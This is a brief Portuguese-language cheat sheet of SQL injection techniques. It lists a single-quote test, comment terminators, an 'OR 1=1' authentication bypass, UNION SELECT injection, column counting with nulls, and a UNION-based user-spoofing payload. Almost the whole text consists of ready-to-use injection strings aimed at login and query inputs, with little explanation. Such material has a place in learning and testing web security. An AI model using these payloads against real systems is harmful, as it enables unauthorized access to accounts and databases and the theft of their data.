#### Verificação simples de SQL Injection
- encerrar input com aspas simples '

#### Concatenar comentário
- encerrar com caracteres especiais de comentarios, cada banco possui o seu.
ex: /*, --

#### Quebra de verificações
nome' OR 1=1 /*

#### UNION 
nome' UNION SELECT 'bogus', '12345' FROM users /*

#### Descobrir numero de coluna
nome' UNION SELECT null, null, null FROM users /*

#### falsificação de usuario
nome' UNION SELECT 'bogus', 'secret', 42 /*